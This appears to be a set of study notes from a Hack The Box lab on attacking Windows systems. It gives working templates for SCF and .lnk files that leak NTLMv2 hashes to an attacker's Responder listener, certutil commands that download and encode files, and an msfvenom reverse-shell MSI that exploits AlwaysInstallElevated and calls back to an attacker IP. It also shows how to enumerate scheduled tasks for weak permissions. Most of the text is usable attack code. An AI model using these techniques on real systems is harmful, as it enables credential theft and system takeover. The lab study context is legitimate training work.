SCF File Exploitation:

A Shell Command File is used by Explorer to move up and down directories and other functionality like showing Desktop, We can manipulate SCF file to have the icon file point to a specific UNC path and have window start smb session, we can attempt to change iconfile to something under our control and use Responder or Inveigh to gain NTLMv2 Password Hash

We first create a file similar to following:
```
[Shell]
Command=2
IconFile=\\<ip>\<sharename>\legit.ico
[Taskbar]
Command=ToggleDesktop
```

We follow other file naming convention to not have the file appear out of place, we also put @ before the filename so that it appears on top of directory and get Executed by explorer as soon as user visit directory, the filename maybe something like `@Inventory.scf`, we do not need to really putup a share, instead we pull up Responder and wait for the victim to verify itself against us

The above technique no longer works at Server 2019, but similar can be archived via use of .lnk file which we can create like the following manner at powershell:
```
$objShell = New-Object -ComObject WScript.Shell
$lnk = $objShell.CreateShortcut("C:\legit.lnk")
$lnk.TargetPath = "\\<attackerIP>\@pwn.png"
$lnk.WindowStyle = 1
$lnk.IconLocation = "%windir%\system32\shell32.dll, 3"
$lnk.Description = "Browsing to the directory where this file is saved will trigger an auth request."
$lnk.HotKey = "Ctrl+Alt+O"
$lnk.Save()
```

Transferring file with certutil:

We can transfer, encode and decode file with certutil:
```
PS C:\htb> certutil.exe -urlcache -split -f <url> <filename>
```

```
C:\htb> certutil -encode file1 encodedfile

Input Length = 7
Output Length = 70
CertUtil: -encode command completed successfully
```

```
C:\htb> certutil -decode encodedfile file2

Input Length = 70
Output Length = 7
CertUtil: -decode command completed successfully.
```

Privilege Escalation with Always Install Elevated:

If Always Install Elevated is enabled, it means that every time when user install application, it will be run in elevated context, after we verify it is on, we can craft malicious payload with msfvenom in .msi format:

```
PS C:\htb> reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer

HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer
    AlwaysInstallElevated    REG_DWORD    0x1
```

```
PS C:\htb> reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer

HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Installer
    AlwaysInstallElevated    REG_DWORD    0x1
```

We then generate payload with msfvenom:
```
Avalon112@htb[/htb]$ msfvenom -p windows/shell_reverse_tcp lhost=10.10.14.3 lport=9443 -f msi > aie.msi
```

By utlizing CVE-2019-1388 we can open a cmd in the context of NT Authority /System due to vulnerability in Windows Certificate Dialog, if we suspect target is affected we can refer https://academy.hackthebox.com/app/module/67/section/635

Privilege Escalation with Scheduled Task:

Like abusing cronjobs, sometimes we maybe able to find scheduled task sitting in a directory that give us permission to modify it, we enumerate schedule task first:

With cmd:
```
C:\htb>  schtasks /query /fo LIST /v
```

With PS:
```
PS C:\htb> Get-ScheduledTask | select TaskName,State
```

We can use accesschk64.exe to enumerate directory privilege like in the following example:
```
C:\htb> .\accesschk64.exe /accepteula -s -d C:\Scripts\
 
Accesschk v6.13 - Reports effective permissions for securable objects
Copyright ⌐ 2006-2020 Mark Russinovich
Sysinternals - www.sysinternals.com
 
C:\Scripts
  RW BUILTIN\Users
  RW NT AUTHORITY\SYSTEM
  RW BUILTIN\Administrators
```

